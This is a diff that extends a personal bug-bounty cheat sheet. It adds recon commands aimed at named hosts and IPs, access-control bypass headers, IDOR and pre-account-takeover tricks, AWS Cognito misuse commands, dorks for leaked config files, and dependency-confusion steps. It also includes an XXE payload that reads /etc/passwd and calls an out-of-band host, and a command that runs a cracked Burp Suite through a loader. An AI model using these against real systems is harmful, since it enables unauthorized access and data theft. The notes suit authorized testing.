@@ -1,4 +1,149 @@
+
+
+
+================   https://dorks.faisalahmed.me    bughunting site automatic
+
+
+
+CWE-20: Improper Input Validation
+CWE-22: Path Traversal
+CWE-77: Command Injection
+CWE-78: OS Command Injection
+CWE-79: Cross-site Scripting (XSS)
+CWE-80: Basic XSS
+CWE-89: SQL Injection
+CWE-90: LDAP Injection
+CWE-94: Code Injection
+CWE-99: HTTP Response Splitting
+CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers
+CWE-120: Buffer Copy without Checking Size of Input
+CWE-126: Buffer Overread
+CWE-131: Incorrect Calculation of Buffer Size
+CWE-134: Uncontrolled Format String
+CWE-190: Integer Overflow or Wraparound
+CWE-200: Exposure of Sensitive Information to an Unauthorized Actor
+CWE-209: Information Exposure Through an Error Message
+CWE-213: Intentional Information Exposure
+CWE-215: Information Exposure Through Debug Information
+CWE-235: Improper Handling of Extra Parameters
+CWE-250: Execution with Unnecessary Privileges
+CWE-284: Improper Access Control
+CWE-306: Missing Authentication for Critical Function
+CWE-307: Improper Restriction of Excessive Authentication Attempts
+CWE-311: Missing Encryption of Sensitive Data
+CWE-312: Cleartext Storage of Sensitive Information
+CWE-319: Cleartext Transmission of Sensitive Information
+CWE-352: Cross-Site Request Forgery (CSRF)
+CWE-362: Race Condition
+CWE-367: Time-of-check Time-of-use (TOCTOU) Race Condition
+CWE-384: Session Fixation
+CWE-400: Uncontrolled Resource Consumption
+CWE-416: Use After Free
+CWE-426: Untrusted Search Path
+CWE-434: Unrestricted Upload of File with Dangerous Type
+CWE-472: External Control of Assumed-Immutable Web Parameter
+CWE-476: NULL Pointer Dereference
+CWE-494: Download of Code Without Integrity Check
+CWE-502: Deserialization of Untrusted Data
+CWE-521: Weak Password Requirements
+CWE-522: Insufficiently Protected Credentials
+CWE-601: URL Redirection to Untrusted Site (‘Open Redirect’)
+CWE-611: Improper Restriction of XML External Entity Reference (XXE)
+CWE-614: Sensitive Cookie in HTTPS Session Without ‘Secure’ Attribute
+CWE-732: Incorrect Permission Assignment for Critical Resource
+CWE-759: Use of a One-Way Hash without a Salt
+CWE-798: Use of Hard-coded Credentials
+CWE-807: Reliance on Untrusted Inputs in a Security Decision
+CWE-918: Server-Side Request Forgery (SSRF)
+
+
+For Graph QL :
+
+Bounty targets at one place :::++https://github.com/arkadiyt/bounty-targets-data
+
+https://github.com/dn0m1n8tor/learn365
+
+
+cd C:\Program Files\Java\jdk-17.0.2\bin
+                             
+java --illegal-access=permit -Dfile.encoding=utf-8 -javaagent:"C:\Users\dev\Desktop\New_loader.jar" -noverify -jar "C:\Users\dev\Desktop\burpsuite_pro_v2022.1.1.jar"
+
+My Cheat seat for finding most coomon bug at very first sight:::::
+
+https://edoverflow.com/2019/ci-knew-there-would-be-bugs-here/ 
+
+https://www.youtube.com/watch?v=l0YsEk_59fQ      Read this artical
+
+http://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html
+
+curl https://internetdb.shodan.io/199.212.246.4        for IP info on shodan
+
+bbscope godfatherarva chaos 
+
+
+updatedb for update the db usefull for locate command
+
+
+Setting mail in ubuntu server https://tonyteaches.tech/postfix-gmail-smtp-on-ubuntu/
+
+
+https://wordlists.assetnote.io/
+
+https://subdomainfinder.c99.nl/scans/2021-09-09/nab.com.au
+
+ 000>>  https://bgp.he.net
+ 
+  hping3 -S 199.212.246.34 -c 100 -p ++1
+ 
+ 
+ amass enum -d domain.com  for subdomain enum
+ 
+ amass enum -df file.txt   subdomain for file.txt where root domain are
+
+
+ altdns -i subss -o subsss -w /home/kali/wordlists/words.txt -r -s altdns
+
+ dnsvalidator -tL https://public-dns.info/nameservers.txt -threads 20 -o resolvers.txt
+
+
+ uncover -q 'org:"Example  Inc."' | httpx | nuclei
+
+ 
+ 
+ 
+ For hash extender 
+ 
+ docker run -Pit alpine
+ 
+ apk add build-base make curl git openssl-dev
+ 
+ git clone https://github.com/iagox86/hash_extender.git
+ 
+ cd hash_extender 
+ 
+ make
+ 
+ Docker command for wordpress:
+ 
+ docker run -it --rm wpscanteam/wpscan --url https://press-smoke.hulu.com/
+
+
+
+
+ If you want to convert josn in xml for xml injection testin then use following site
+
+
+
+=====>>>>> https://www.freeformatter.com/json-to-xml-converter.html
+ 
+ 
+ >>>>>>>  Use pastbin for host some data linke html , xxe, cors
+ 
 ================================================================================================
+
+
+
+
  
 Some rate limiting bypass::::::
 
@@ -7,10 +152,49 @@ X-Forwarded-For: 127.0.0.1
 X-Remote-IP: 127.0.0.1
 X-Remote-Addr: 127.0.0.1
 X-Forwarded-Host: 127.0.0.1
+
+Some 401 bypass:
+
+X-Originating-IP: 127.0.0.1
+X-Forwarded-For: 127.0.0.1
+X-Forwarded: 127.0.0.1
+Forwarded-For: 127.0.0.1
+X-Remote-IP: 127.0.0.1
+X-Remote-Addr: 127.0.0.1
+X-ProxyUser-Ip: 127.0.0.1
+X-Original-URL: 127.0.0.1
+Client-IP: 127.0.0.1
+True-Client-IP: 127.0.0.1
+Cluster-Client-IP: 127.0.0.1
+X-ProxyUser-Ip: 127.0.0.1
+Host: localhost
+
+If the path is protected you can try to bypass the path protection using these other headers:
+
+
+X-Original-URL: /admin/console
+X-Rewrite-URL: /admin/console
+
+
+
 =================================================================================================
 https://bugbountyhunter.com/
 
 https://danielmiessler.com/projects/webappsec_testing_resources/     Methodology For bugs
+
+
+
+0  >>>> IDOR bypass for 401/403
+
+
+       >> Wrap ID with an array {“id”:111} --> {“id”:[111]}
+       >> JSON wrap {“id”:111} --> {“id”:{“id”:111}}
+       >> Send ID twice URL?id=<LEGIT>&id=<VICTIM>
+       >> Send wildcard {""user_id"":""*""}
+
+
+
+
 
 
 1  >>>>   No Rate Limiting  & Delete account without confirmation 
@@ -98,6 +282,7 @@ https://danielmiessler.com/projects/webappsec_testing_resources/     Methodology
                   Although X-Forwarded-Host is the de facto standard for this behavior, you may come across other headers that
                   serve a similar purpose, including: 
                    
+                   - X-Forwarded-Host: 
                    - X-Host:
                    - X-Forwarded-Server:
                    - X-HTTP-Host-Override:
@@ -122,13 +307,19 @@ https://busk3r.medium.com/oauth-2-0-hacking-simplified-part-2-vulnerabilities-an
 5  >>>>   Oauth  account connect CSRF
 
 
-6  >>>>   Oauth Url Redirect 
+6  >>>>   Oauth Url Redirect , try to this with open redirect and LFI
 
 
 7  >>>>   Oauth Url Redirect account takeover
 
+           
 
-8  >>>>   
+
+8  >>>>   Pre Account Takeover 
+
+        > If the application does not require email verification on account creation, try creating an account with a victim’s email address and attacker password before the victim has registered. If the victim then tries to register or sign in with a third party, such as Google, it’s possible the application will do a lookup, see that email is already registered, then link their Google account to the attacker created account. This is a “pre account takeover” where an attacker will have access to the victim’s account if they created it prior to the victim registering.
+
+        > If an OAuth app does not require email verification, try signing up with that OAuth app and then change the email address with a victim’s email address. The same issue as above could exist, but you’d be attacking it from the other direction and getting access to the victim’s account for an account takeover.
 
 
 
@@ -441,8 +632,9 @@ https://busk3r.medium.com/oauth-2-0-hacking-simplified-part-2-vulnerabilities-an
       <foo xmlns:xi="http://www.w3.org/2001/XInclude">
       <xi:include parse="text" href="file:///etc/passwd"/></foo>
           
-          
-          
+       You can use below payload , when entit is not accepted
+
+       <ybp xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://a1cqa1g0av62cr8djc1k4s96dxjq7j97av2iz6o.burpcollaborator.net/foo"/></ybp>   
           
           XXE with file upload 
           
@@ -476,7 +668,7 @@ https://busk3r.medium.com/oauth-2-0-hacking-simplified-part-2-vulnerabilities-an
                  
 
 
-39  >>> HTTP request smugling (cat list_of_hosts.txt | python3 smuggler.py)
+39  >>> HTTP request smugling 
      
          https://www.youtube.com/watch?v=XC48irGjKNc
          https://portswigger.net/web-security/request-smuggling
@@ -695,6 +887,8 @@ https://busk3r.medium.com/oauth-2-0-hacking-simplified-part-2-vulnerabilities-an
                           
 444  >>  AWS pentesting
 
+          You can also use s3scanner tool 
+
 
           ---> aws set to list for everyone
                      aws s3 ls  s3://flaws.cloud/ --no-sign-request --region us-west-2
@@ -722,6 +916,79 @@ https://busk3r.medium.com/oauth-2-0-hacking-simplified-part-2-vulnerabilities-an
                   --->   Delete S3 Object                 
                      aws s3 rm s3://my-awesome-new-bucket/secret-file.gz
              delete: s3://my-awesome-new-bucket/secret-file.gz
+
+
+
+  For ACL testing you can use following command:: aws s3api get-bucket-acl --bucket bucket-name --no-sign-request
+
+
+
+
+
+  >>>>> AWS Cognito Misconfiguration :::::::::::::::::::::::::::::::::::::: 
+
+         https://www.youtube.com/watch?v=TuiDJ5Ii6MU
+     
+
+
+     aws congnito , you can add user signup and signin feature and control access to your web and mobile applications .
+
+     amazone cognito provides a identiry store that scales to millions of user supports social and enterprize ferdaration.
+
+
+   >>>Intro to aws cognito 
+
+     > User Pools : allows sign-in and signup functionality 
+     > Identity Pools : allows authenticated and unauthenticated users to access aws resources using temporary aws credetials..
+
+
+  >>>>> Security misconfiguration 1 > Unauthrized access to aws services due to liberal aws credentials 
+
+      Try to fetch aws credentials as unauthenticated user 
+
+      To generate the aws credentials , we need to find Identiy Pool Id which mostly hardcoded in source code in bundle js or HTTP respoce , other usefull info you can find 
+      :
+      >client id
+      >user pool id
+      >region
+
+     Command $: aws cognito-identity get-id --identity-pool-id <identity-pool-id> --region <region>
+
+      above commnad give identity-id 
+
+            $: aws cognito-identity get-credentials-for-identity --identity-id <identity-id> --region <region>
+
+
+
+ >>>>>> Security misconfiguration 2 > Authentication bypass due to signup API action 
+
+      Applicatin not offering user signup only supporting administrative provision of accounts could be vulnerable due to not disabling signup API action
+
+      Try to signup with following command :
+
+      $: aws cognito-idp signup --cliet-id 4aa41hr4s2apkli7ivikgf1afg --username ranveer2354@gmail.com --password 8890@#%$devD --region us-east-1
+
+
+
+>>>>> Security misconfiguration 3 > Priviledge escalatin through writable user attributes 
+
+    Fetch user attribute after login account :
+
+     $:aws cognito-idp get-uer --region <region> --access-token <token>
+
+    Updating user attributes 
+
+     $:aws cognito-idp update-user-attributes --region <region> --access-token <token> --update-attributes Name=<name> ,value=<value>
+
+
+
+>>>>> Security misconfiguration 4 > Updating email attributes before the verifivation 
+
+    Even with email verfication enabled, most application update the email attribute to new unverfied email address. From this user can login with new email without verified .
+
+
+
+
                          
                          
                          
@@ -843,9 +1110,10 @@ site:.financialforce.com inurl:*/admin/*                     Shows the admin pag
 
 site:.financialforce.com inurl:*/api?*
 
-                    
+site:*.dell.com -www                                        Remove the www subdomains from the output        
 
 
+site:"target[.]com" ext:log | ext:txt | ext:conf | ext:cnf | ext:ini | ext:env | ext:sh | ext:bak | ext:backup | ext:swp | ext:old | ext:~ | ext:git | ext:svn | ext:htpasswd | ext:htaccess
 
 
 
@@ -969,3 +1237,34 @@ https://www.example.com/api/v1/users/..;/
            
            
            
+  
+
+
+
+
+
+56>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>     Dependecy Confusion
+
+
+
+
+
+
+
+https://www.youtube.com/watch?v=UHOvcdjAixY
+
+1. In Web application if we found  package.json or packeg-lock.json then we test for dependency confusion
+
+2. Then we test for public and private npm library 
+
+3. Dependency confusion happen only on private library and check on https://registry.npmjs.org/underscore like underscore is available we cannot takeover
+
+4. We can create own public librarry 
+
+4. What happens if malicious code is uploaded to npm under these names? Is it possible that some of web app will start defaulting to the new public packages instead of the private ones?
+
+
+oneliner for dependency confusion check 
+
+find . -type f -name package.json | xargs -n1 -I{} cat {} | jq -r '.dependencies + .devDependencies' | cut -d : -f 1 | tr -d '"|}|{' | sort -u | tr -s "     " | sort -u | xargs -n1 -I{} echo "https://registry.npmjs.org/{}" | grep -v "@" | httpx -status-code -silent -content-length -mc 404
+
